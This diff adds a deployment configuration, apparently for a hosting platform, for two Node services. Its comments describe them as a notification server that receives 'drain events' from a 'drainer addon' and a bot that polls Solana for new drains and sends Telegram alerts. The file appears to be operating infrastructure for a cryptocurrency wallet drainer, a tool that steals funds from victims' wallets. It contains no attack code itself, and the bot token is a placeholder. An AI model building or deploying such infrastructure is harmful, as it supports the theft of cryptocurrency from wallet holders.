@@ -1,0 +1,33 @@
+# ============================================================
+# SERVICE 1: Telegram Notification Server (Web)
+# Receives drain events from drainer addon → sends Telegram
+# ============================================================
+- type: web
+  name: fedfanta-server
+  env: node
+  plan: free
+  region: oregon
+  buildCommand: npm install
+  startCommand: node server.js
+  envVars:
+    - key: NODE_ENV
+      value: production
+    - key: PORT
+      value: 9876
+
+# ============================================================
+# SERVICE 2: Telegram Polling Bot (Background Worker)
+# Polls Solana for new drains → pushes alerts to Telegram
+# ============================================================
+- type: worker
+  name: fedfanta-bot
+  env: node
+  plan: free
+  region: oregon
+  buildCommand: npm install
+  startCommand: node bot.js
+  envVars:
+    - key: NODE_ENV
+      value: production
+    - key: BOT_TOKEN
+      value: YOUR_BOT_TOKEN_HERE
